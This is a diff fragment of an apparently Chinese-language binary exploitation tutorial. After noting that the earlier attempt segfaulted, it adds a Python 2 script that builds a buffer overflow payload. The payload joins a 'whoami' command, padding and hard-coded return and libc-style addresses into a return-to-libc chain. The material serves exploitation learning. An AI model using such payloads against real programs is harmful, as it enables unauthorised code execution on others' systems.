@@ -122,7 +122,37 @@ print nopsled + "FAKE" +  ret + system + "FAKE" + argv\_addr
 
 执行后，会出现段错误。
 
+修改代码如下：
+
+\#!/usr/bin/env python
 
 
 
+offset = 0x50
+
+cmd = "whoami"
+
+junk = "J" \* \(offset - len\(cmd\)\)
+
+gadg\_ret = "\x17\x86\x04\x08"
+
+ret1= "\xb0\xff\xec\xb7"
+
+ret2 = "\xc0\x60\xec\xb7"
+
+arg1 = "\x46\xff\xff\xbf"
+
+
+
+
+
+payload = cmd + junk + gadg\_ret + ret1 + ret2 + arg1
+
+
+
+print payload
+
+~               
+
+![](/png/45.png)
 
